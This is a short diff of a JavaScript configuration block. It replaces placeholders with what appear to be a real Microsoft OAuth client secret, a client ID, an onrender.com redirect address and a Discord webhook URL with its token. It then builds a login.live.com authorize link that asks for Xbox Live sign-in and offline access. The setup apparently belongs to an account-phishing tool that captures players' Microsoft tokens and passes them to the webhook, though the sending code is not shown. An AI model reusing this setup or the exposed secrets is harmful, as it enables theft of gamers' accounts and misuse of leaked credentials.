@@ -1,8 +1,8 @@
 //Change these btw
-const client_secret = 'secret'
-const client_id = 'cid'
-const redirect_uri = 'redirect'
-const webhook_url = 'Your webhook'
+const client_secret = 'WEP8Q~n2HKngYXL3b.AHrg6kBQGAseDmzr-Z_aea'
+const client_id = 'de01b581-28c7-4ebc-8b38-73c848b588f8'
+const redirect_uri = 'https://necrons-slayer.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1116046426120671364/S2vkJtF_PuEWaGFEteEFf9CQ1iHoM2Y_0tsSKPdzZiXyf0c3JvP9M7cTgsEjoYhxvDYo'
 
 //Requirements
 const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
